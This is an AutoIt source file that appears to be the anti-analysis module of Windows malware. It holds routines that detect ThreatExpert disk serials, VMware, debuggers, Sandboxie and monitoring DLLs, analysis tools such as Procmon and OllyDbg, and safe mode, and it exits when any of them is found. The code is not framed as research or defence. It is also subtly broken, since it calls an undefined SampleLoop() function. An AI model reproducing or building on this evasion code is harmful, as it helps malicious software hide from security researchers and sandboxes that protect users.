#include <WinAPI.au3>
#include <WinAPI.au3>
#include <WindowsConstants.au3>

Func Antis()
   ;ConsoleWrite("Starting Antis" & @CRLF)

   SampleLoop()
   AntiThreatExpert()
   AntiVMWare()
   FindWindows()
   IsDebugging()
   ModuleHandle()
   If IsSafeMode() Then Exit

   ;ConsoleWrite("All Ok :)" & @CRLF)
EndFunc

Func SampleName()
   If StringCompare(@ScriptName, "sample.exe") Then
	  Exit
   EndIf
EndFunc

Func AntiThreatExpert()
   $objWMIService = ObjGet("winmgmts:\\.\root\CIMV2")
   $colItems = $objWMIService.ExecQuery("SELECT * FROM Win32_LogicalDisk")
   For $objItem In $colItems
	  If $objItem.VolumeSerialNumber = 0xCD1A40 Or $objItem.VolumeSerialNumber = 0x70144646  Then
		 Exit
	  EndIf
   Next
EndFunc

Func AntiVMWare()
   $regRead = RegRead("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Disk\Enum", "0")
   If StringInStr(StringLower($regRead), "vmware") > 0 Then
	  Exit
   EndIf
EndFunc

Func FindWindows()
   Local $sWindows = "gdkWindowTopLevel|PROCEXPL|PROCMON_WINDOW_CLASS|TCPViewClass|ThunderRT6FormDC|OllyDBG|Autoruns"
   Local $sWindowsArray = StringSplit($sWindows, "|")
   For $i = 1 To $sWindowsArray[0]
	  If WinGetTitle ($sWindowsArray[$i]) Then
		 Exit
	  EndIf
   Next
EndFunc

Func IsDebugging() ;http://www.autoitscript.com/forum/topic/17259-would-this-dll-call-work/
   Local $Ret = DLLCall('Kernel32.dll', 'Int', 'IsDebuggerPresent')
   If $Ret > 0 Then
	  Exit
   EndIf
EndFunc

Func ModuleHandle()
   Local $sModules = "sbiedll|dbghelp|api_log|dir_watch|pstorec|vmcheck|wpespy"
   Local $sModulesArray = StringSplit($sModules, "|")
   For $i = 1 To $sModulesArray[0]
	  If _WinAPI_GetModuleHandle($sModulesArray[$i] & ".dll")> 0 Then
		 Exit
	  EndIf
   Next
EndFunc

Func IsSafeMode()
    Return _WinAPI_GetSystemMetrics($SM_CLEANBOOT) > 0
EndFunc   ;==>_IsSafeMode